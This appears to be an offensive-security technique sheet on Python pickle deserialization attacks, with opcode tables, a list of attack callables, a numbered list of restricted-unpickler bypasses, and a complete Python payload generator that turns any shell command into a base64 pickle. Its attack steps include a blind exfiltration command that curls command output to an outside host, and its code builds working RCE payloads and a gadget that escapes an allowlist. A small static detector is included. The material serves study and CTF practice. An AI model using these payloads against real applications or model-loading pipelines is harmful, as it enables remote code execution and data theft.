---
title: "Python Pickle - Deserialization RCE, __reduce__ and Restricted-Unpickler Bypass"
category: web
subcategory: deserialization
type: technique
tags: [pickle, pickle-loads, deserialization, python, reduce, rce, opcodes, pickletools, restricted-unpickler, find-class, marshal, shelve, joblib, numpy-allow-pickle, pytorch-load, celery, flask-session, django-session, base64, gadget]
difficulty: medium
summary: "pickle.loads on attacker data is RCE: __reduce__ emits a REDUCE opcode that calls any callable; hand-written opcodes bypass most find_class filters."
when_to_use:
  - "Any pickle.loads / pickle.load / cPickle / _pickle on data you influence"
  - "A cookie or upload that base64-decodes to bytes starting with \\x80\\x04 or \\x80\\x05 or 'gASV'/'gAJ'"
  - "Django SESSION_SERIALIZER=PickleSerializer, Celery pickle task serializer, joblib/numpy/torch model files"
  - "A 'RestrictedUnpickler' with a find_class allowlist that you need to escape"
tools: [python3, pickletools, fickling, flask-unsign, anypickle]
related: [python-flask-django-attacks, python-format-string-leak, deser-php-object-injection, deser-java-ysoserial]
---

## TL;DR

Pickle is a stack virtual machine, not a data format. The `REDUCE` opcode pops a callable and an
argument tuple and calls it. `__reduce__` is just the ergonomic way to emit that. Therefore
**any** `pickle.loads` on attacker-controlled bytes is remote code execution, and no amount of
`__reduce__` blacklisting helps because you can write the opcodes directly.

## Recognise it

- Magic prefix: `\x80\x02` (proto 2), `\x80\x03` (py3 default <3.8), `\x80\x04` (3.8+),
  `\x80\x05` (3.12 default in some paths). Base64: `gAJ`, `gAM`, `gASV`, `gAWV`.
- Protocol 0 is printable ASCII and looks like `cos\nsystem\n(S'id'\ntR.` -- easy to spot in a log.
- Every pickle ends with `.` (the `STOP` opcode).
- Code smells: `pickle.loads(base64.b64decode(request.cookies['data']))`,
  `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'`,
  `CELERY_TASK_SERIALIZER = 'pickle'`, `np.load(f, allow_pickle=True)`,
  `torch.load(f)` (pre-2.6 default `weights_only=False`), `joblib.load`, `shelve.open`,
  `pandas.read_pickle`, `dill.loads`, `cloudpickle.loads`.
- A `RestrictedUnpickler` subclass overriding `find_class` is a neon sign that pickles are
  attacker-reachable.

## Theory

### The machine

A pickle is a bytecode stream operating on a stack and a memo (register file). Opcodes you need:

| Opcode | Byte | Effect |
| --- | --- | --- |
| `PROTO` | `\x80 N` | declare protocol |
| `FRAME` | `\x95 <q>` | proto 4 framing, 8-byte LE length |
| `SHORT_BINUNICODE` | `\x8c len s` | push a str |
| `BINUNICODE` | `X <i> s` | push a str, 4-byte LE length |
| `MEMOIZE` | `\x94` | store TOS in the memo |
| `BINGET` / `LONG_BINGET` | `h i` / `j <i>` | push memo[i] |
| `EMPTY_TUPLE` / `TUPLE1` / `TUPLE2` / `TUPLE3` | `)` / `\x85` / `\x86` / `\x87` | build a tuple |
| `MARK` / `TUPLE` | `(` / `t` | tuple of everything above the mark |
| `GLOBAL` | `c mod \n name \n` | push `getattr(import(mod), name)` -- **calls find_class** |
| `STACK_GLOBAL` | `\x93` | pop name, pop module, same as GLOBAL -- **also calls find_class** |
| `REDUCE` | `R` | `func, args = pop, pop; push func(*args)` |
| `BUILD` | `b` | `obj.__setstate__(state)` or `obj.__dict__.update(state)` |
| `INST` / `OBJ` | `i` / `o` | old-style class instantiation |
| `NEWOBJ` / `NEWOBJ_EX` | `\x81` / `\x92` | `cls.__new__(cls, *args)` |
| `EMPTY_DICT` / `SETITEM` / `SETITEMS` | `}` / `s` / `u` | dicts |
| `POP` / `DUP` / `MARK` | `0` / `2` / `(` | stack plumbing |
| `STOP` | `.` | return TOS |

### `__reduce__`

```python
class P:
    def __reduce__(self):
        return (os.system, ("id",))
```

`pickle.dumps(P())` emits `GLOBAL posix system`, the arg tuple, then `REDUCE`. The return value
may also be a 2-6 tuple `(callable, args, state, listitems, dictitems, state_setter)` -- the
3rd element feeds `BUILD` (i.e. `__setstate__`), the 6th (proto 5) lets you call an arbitrary
setter, which is another `REDUCE` in disguise.

`__reduce_ex__(protocol)` takes precedence and is what `copyreg` uses; overriding it works
identically and dodges naive source greps for `__reduce__`.

### Callables that are not `os.system`

Anything importable and callable works. Ranked by usefulness when imports are filtered:

```
builtins.exec / builtins.eval / builtins.__import__ / builtins.getattr / builtins.compile
os.system / os.popen / os.execv / posix.system
subprocess.Popen / subprocess.check_output / subprocess.run / subprocess.getoutput
pty.spawn
platform.os.system              # re-export hop
importlib.import_module
operator.methodcaller / operator.attrgetter    # attribute pivot, survives many allowlists
functools.partial
warnings.catch_warnings         # no-op but reaches its module globals
copyreg._reconstructor          # legacy object construction
types.FunctionType              # build a function from a code object (marshal)
```

`exec` returns `None` so a blind `REDUCE` chain works fine; use `builtins.eval` when you need
the value back in the pickle's result.

### Restricted unpicklers

The documented mitigation:

```python
class RU(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "mymod" and name in {"Thing"}:
            return getattr(sys.modules[module], name)
        raise pickle.UnpicklingError("nope")
```

Bypass surface:

1. **Allowlisted callable with side effects.** If any permitted name is callable with
   attacker-controlled args you get a primitive. `mymod.Thing` that does `eval(self.expr)` in
   `__init__`, a config setter, a path joiner into `open()`, an ORM query, etc.
2. **Module allowlist too wide.** `module.startswith("numpy")` lets you reach
   `numpy.testing._private.utils.runstring` or `numpy.f2py` helpers. `"os.path"` allowed ->
   `os.path.os.system` is not reachable via GLOBAL (name cannot contain a dot) but *is* via
   two GLOBALs + `getattr` if `builtins.getattr` is allowed.
3. **`getattr` allowed** collapses everything: `getattr(getattr(__import__('os'),'system'))`.
4. **Only checking `name`, not `module`**, or vice versa.
5. **`BUILD` on an allowlisted instance**: `__setstate__` or a `__dict__` update can overwrite a
   method, a path, a template, or `__class__` itself (setting `obj.__class__` to another
   allowlisted class is a type-confusion primitive).
6. **`NEWOBJ` on an allowlisted class** skips `__init__` and its validation entirely.
7. **Memo abuse / `find_class` not called** for opcodes that resolve from the memo -- if the
   unpickler allowlists a class once, `BINGET` re-pushes it for free.
8. **`pickle.loads` called again downstream** on data your first pickle produced.
9. **Python-level vs C-level unpickler**: `pickle.Unpickler` (C) and `pickle._Unpickler` (py)
   have subtle differences; a filter installed only on one is bypassed by protocol choices that
   route to the other (e.g. `pickle.loads` always uses C, `pickletools.dis` uses neither).

The only robust fix is not unpickling untrusted data.

## Attack

1. **Confirm the format.** `base64 -d` the blob, check for `\x80` and a trailing `.`.
   Run `python3 -m pickletools -a file.pkl` to disassemble without executing.
2. **Build the simplest payload** (`os.system` + a curl/sleep for blind confirmation).
3. **Match the protocol** the app expects. Protocol 0 sometimes slips past a filter looking for
   `\x80`; protocol 2 is the most compatible; protocol 5 is needed for out-of-band buffers only.
4. **Wrap correctly.** Django sessions are `base64(pickle):hmac`; Flask sessions are
   itsdangerous-signed; Celery is a JSON envelope with a base64 body. Get the outer signing
   right or the pickle is never reached.
5. **Blind?** Use `os.system("curl http://h/$(id|base64 -w0)")` or a `sleep 7` timing oracle.
6. **Filtered?** Disassemble their unpickler's allowlist, then hand-write opcodes.

## Code

```python
#!/usr/bin/env python3
"""Pickle payload factory: __reduce__ payloads, hand-written opcodes, and a
restricted-unpickler bypass demo. Self-testing and hermetic.
"""
from __future__ import annotations

import base64
import io
import os
import pickle
import pickletools
import struct
import sys
import tempfile

# ---------------------------------------------------------------------------
# 1. Classic __reduce__ payloads
# ---------------------------------------------------------------------------


class SystemRCE:
    """os.system(cmd) on load."""

    def __init__(self, cmd: str) -> None:
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


class ExecRCE:
    """builtins.exec(src) on load -- arbitrary Python, not just a shell."""

    def __init__(self, src: str) -> None:
        self.src = src

    def __reduce__(self):
        return (exec, (self.src,))


class EvalLeak:
    """builtins.eval(expr) -- the RESULT becomes the unpickled object."""

    def __init__(self, expr: str) -> None:
        self.expr = expr

    def __reduce__(self):
        return (eval, (self.expr,))


def payload(cmd: str, proto: int = 2, kind: str = "system") -> bytes:
    obj = {"system": SystemRCE, "exec": ExecRCE, "eval": EvalLeak}[kind](cmd)
    return pickle.dumps(obj, protocol=proto)


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode()


# ---------------------------------------------------------------------------
# 2. Hand-written opcodes -- no class, no __reduce__, arbitrary module/name
# ---------------------------------------------------------------------------

def handcrafted(module: str, name: str, arg: str, proto: int = 0) -> bytes:
    """Emit GLOBAL <module> <name>; push arg; TUPLE1; REDUCE; STOP."""
    if proto == 0:
        # printable-ASCII pickle: survives naive "\x80" checks
        return (b"c" + module.encode() + b"\n" + name.encode() + b"\n"
                + b"(S" + repr(arg).encode() + b"\ntR.")
    out = bytearray()
    out += b"\x80" + bytes([proto])
    out += b"c" + module.encode() + b"\n" + name.encode() + b"\n"
    a = arg.encode()
    out += b"\x8c" + bytes([len(a)]) + a if len(a) < 256 else \
        b"X" + struct.pack("<I", len(a)) + a
    out += b"\x85"      # TUPLE1
    out += b"R"         # REDUCE
    out += b"."         # STOP
    return bytes(out)


def stack_global(module: str, name: str, arg: str) -> bytes:
    """Same call, built with STACK_GLOBAL (proto 4) instead of GLOBAL.

    Some naive filters only grep for the 'c' opcode or for 'cos\\nsystem'.
    """
    def su(s: str) -> bytes:
        b = s.encode()
        assert len(b) < 256
        return b"\x8c" + bytes([len(b)]) + b

    body = su(module) + su(name) + b"\x93" + su(arg) + b"\x85" + b"R" + b"."
    return b"\x80\x04\x95" + struct.pack("<Q", len(body)) + body


def getattr_chain(cmd: str) -> bytes:
    """builtins.getattr(__import__('os'), 'system')(cmd).

    Useful when 'os' is blocked as a GLOBAL module but builtins is allowed.
    Every MARK is explicit -- get them wrong and the C unpickler just says
    "unpickling stack underflow".
    """
    return (
        b"cbuiltins\ngetattr\n"            # push getattr
        b"("                               # MARK
        b"cbuiltins\n__import__\n"         # push __import__
        b"(S'os'\ntR"                      # __import__('os') -> os
        b"S'system'\n"                     # push 'system'
        b"tR"                              # getattr(os, 'system')
        b"(S" + repr(cmd).encode() + b"\ntR."   # os.system(cmd)
    )


def build_gadget(module: str, name: str, state: dict) -> bytes:
    """NEWOBJ an allowlisted class then BUILD it with attacker state.

    This never calls the class's __init__, so constructor validation is skipped.
    """
    body = bytearray()
    body += b"c" + module.encode() + b"\n" + name.encode() + b"\n"
    body += b")\x81"                       # EMPTY_TUPLE, NEWOBJ
    body += pickle.dumps(state, protocol=2)[2:-1]   # strip PROTO and STOP
    body += b"b."                          # BUILD, STOP
    return b"\x80\x02" + bytes(body)


# ---------------------------------------------------------------------------
# 3. Inspect without executing
# ---------------------------------------------------------------------------

def disassemble(data: bytes) -> str:
    buf = io.StringIO()
    pickletools.dis(data, out=buf)
    return buf.getvalue()


def globals_used(data: bytes) -> list[tuple[str, str]]:
    """List every (module, name) a pickle would import. Safe: no execution."""
    found: list[tuple[str, str]] = []
    stack: list[str] = []
    for op, arg, _pos in pickletools.genops(data):
        if op.name in ("GLOBAL", "INST"):
            if isinstance(arg, str) and " " in arg:
                mod, _, nm = arg.partition(" ")
                found.append((mod, nm))
        elif op.name in ("SHORT_BINUNICODE", "BINUNICODE", "UNICODE", "STRING",
                         "SHORT_BINSTRING", "BINSTRING"):
            stack.append(arg if isinstance(arg, str) else str(arg))
        elif op.name == "STACK_GLOBAL":
            if len(stack) >= 2:
                found.append((stack[-2], stack[-1]))
    return found


def is_dangerous(data: bytes, allow: set[tuple[str, str]] | None = None) -> bool:
    allow = allow or set()
    return any(g not in allow for g in globals_used(data))


# ---------------------------------------------------------------------------
# 4. A restricted unpickler and its bypass
# ---------------------------------------------------------------------------

class Config:
    """An 'innocent' allowlisted class with a dangerous __setstate__."""

    def __init__(self) -> None:
        self.path = "/tmp/safe"
        self.loaded = False

    def __setstate__(self, state: dict) -> None:
        self.__dict__.update(state)
        self.loaded = True


class Restricted(pickle.Unpickler):
    """Only allows __main__.Config -- and is still exploitable via BUILD."""

    ALLOWED = {("__main__", "Config")}

    def find_class(self, module: str, name: str):
        if (module, name) in self.ALLOWED:
            return globals()[name]
        raise pickle.UnpicklingError("blocked %s.%s" % (module, name))


def restricted_loads(data: bytes):
    return Restricted(io.BytesIO(data)).load()


# ---------------------------------------------------------------------------
# Self-test
# ---------------------------------------------------------------------------

def _self_test() -> None:
    workdir = tempfile.mkdtemp(prefix="pickle-selftest-")
    marker = os.path.join(workdir, "marker")

    # 1. __reduce__ really executes
    p = payload("touch " + marker, proto=2, kind="system")
    assert p.startswith(b"\x80\x02") and p.endswith(b".")
    pickle.loads(p)
    assert os.path.exists(marker), "os.system did not run"
    os.unlink(marker)

    # 2. exec variant runs arbitrary Python
    pickle.loads(payload("import os;os.mkdir(%r)" % (marker + "d"),
                         kind="exec"))
    assert os.path.isdir(marker + "d")
    os.rmdir(marker + "d")
    os.rmdir(workdir)

    # 3. eval variant returns a value
    assert pickle.loads(payload("6*7", kind="eval")) == 42

    # 4. hand-written proto-0 opcodes are printable and work
    h = handcrafted("builtins", "eval", "1+1", proto=0)
    assert b"\x80" not in h, "proto 0 must be printable"
    assert pickle.loads(h) == 2

    # 5. hand-written proto-2 opcodes
    h2 = handcrafted("builtins", "eval", "3*3", proto=2)
    assert pickle.loads(h2) == 9

    # 6. STACK_GLOBAL form avoids the 'c' opcode entirely
    sg = stack_global("builtins", "eval", "4*4")
    assert b"\ncbuiltins\n" not in sg
    assert pickle.loads(sg) == 16

    # 7. getattr chain
    gc = getattr_chain("true")
    assert pickle.loads(gc) == 0          # os.system("true") -> 0

    # 8. static analysis finds the globals WITHOUT executing
    assert ("builtins", "eval") in globals_used(h2)
    assert ("builtins", "eval") in globals_used(sg), globals_used(sg)
    assert is_dangerous(h2)
    assert not is_dangerous(h2, allow={("builtins", "eval")})
    assert "REDUCE" in disassemble(h2)

    # 9. the restricted unpickler blocks the obvious payload
    try:
        restricted_loads(payload("id"))
        raise AssertionError("restricted unpickler should have blocked os.system")
    except pickle.UnpicklingError:
        pass

    # 10. ... but BUILD on the allowlisted class still rewrites its state
    bg = build_gadget("__main__", "Config", {"path": "/etc/shadow", "pwned": True})
    cfg = restricted_loads(bg)
    assert isinstance(cfg, Config)
    assert cfg.path == "/etc/shadow" and cfg.pwned is True and cfg.loaded is True

    # 11. base64 wrapper helper
    assert base64.b64decode(b64(h2)) == h2

    print("[ok] %d payload builders verified, restricted-unpickler bypass proved"
          % 6)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        print(b64(payload(sys.argv[1])))
    else:
        _self_test()
```

## Variants & pitfalls

- **`pickle.loads` vs `pickle.Unpickler`**: `loads` always uses the C implementation and always
  honours an overridden `find_class` only if you subclass `Unpickler`. A filter written as a
  wrapper function around `loads` does nothing.
- **Protocol mismatch**: Python 3 cannot load a protocol-0 pickle containing `c__builtin__`
  (Python 2 module name) unless `encoding='latin1'` and the module exists. Use `builtins`.
- **`fix_imports=True`** (the default) silently rewrites Python 2 module names -- handy for
  bypassing a blocklist that greps for `os`: `cposix\nsystem\n` also works on Linux.
- **`numpy.load(allow_pickle=True)`** and `.npy` object arrays carry pickles; so do
  `joblib`, `pandas.read_pickle`, `torch.load` (before `weights_only=True` became the default),
  `sklearn` model files, and `dill`/`cloudpickle` (which additionally pickle *code objects*,
  giving you `types.FunctionType(marshal.loads(...), globals())` without any import at all).
- **`shelve` / `dbm`**: values are pickles; a writable shelve file is RCE on next open.
- **Celery**: `task_serializer='pickle'` plus a reachable broker = RCE on every worker.
- **Django**: `PickleSerializer` was removed in Django 4.1 but appears constantly in CTF; the
  session cookie is `base64(pickle):hmac_sha1(secret + salt)`, so you need `SECRET_KEY` first.
- **Size limits**: `FRAME` (proto 4) headers must match the body length or the C unpickler
  raises; if you edit a proto-4 pickle by hand, rebuild the frame or downgrade to proto 2.
- **Non-ASCII in proto 0**: `S'...'` uses repr-escaping, so binary data needs `\xNN` escapes.
- **Detection-only defence**: `fickling` can statically analyse and even "sanitise" pickles;
  `globals_used()` above is a 20-line version of the same idea.
- **`__reduce__` returning a 6-tuple** (`state_setter`) in protocol 5 is a second REDUCE that
  many analysers miss.

## Tools

- `python3 -m pickletools -a payload.pkl` -- annotated disassembly, never executes.
- `fickling` -- static pickle analysis, decompilation to Python, injection helpers.
- `flask-unsign` / `django-admin shell` -- for the outer signing layers.
- `pickletools.genops` -- the programmatic API used above.

## References

- CPython documentation -- `pickle` module, "Warning: The pickle module is not secure".
- PEP 307 -- Extensions to the pickle protocol (`__reduce_ex__`, protocol 2).
- Trail of Bits -- `fickling` project documentation.
- David Fifield / Nelson Elhage -- classic writeups on pickle opcode-level exploitation.
